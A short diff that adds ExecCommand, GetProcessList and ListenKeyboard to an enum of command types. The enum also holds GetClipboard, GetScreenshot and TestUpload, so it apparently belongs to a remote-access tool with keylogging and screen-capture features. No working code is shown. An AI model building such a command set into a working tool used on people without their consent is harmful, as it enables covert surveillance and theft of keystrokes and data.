@@ -17,6 +17,9 @@ enum cmd_type {
     TestUpload,
     GetClipboard,
     GetScreenshot,
+	ExecCommand,
+	GetProcessList,
+	ListenKeyboard,
     OK,
     Reset
 };
